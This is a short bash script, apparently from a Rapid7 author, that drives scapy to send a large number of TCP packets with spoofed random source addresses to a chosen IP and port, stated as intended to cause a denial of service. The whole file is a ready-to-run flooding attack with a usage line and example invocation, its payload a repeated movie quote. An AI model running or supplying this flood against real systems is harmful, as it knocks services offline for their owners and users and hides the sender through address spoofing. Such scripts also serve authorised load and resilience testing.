#! /bin/bash
#Creator: Andrew 'Schlpr0k' Bindner
#Company: Rapid7
#Version: 0.1.1
#Date: 17-Aug-17
#Description: Send a large amount of traffic to a specific victim on a particular targeted port to hopefully cause a DoS. 

if [ -z $1 ] || [ -z $2 ] || [ -z $3 ]; then 
  echo Usage: ./scapy_dos.sh {IP Address}  {Target Port}  {Number of Packets to Send}
  echo Example: ./scapy_dos.sh 192.168.1.1 443 1000000
  exit
fi

payload=$(echo \"If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that --Rapid7--\")

victim=$(echo \"$1\")
scapy << EOF
send(IP(src=RandIP(),dst=$victim)/TCP(sport=RandNum(1024,65535),dport=$2)/$payload,count=$3,loop=1)
EOF
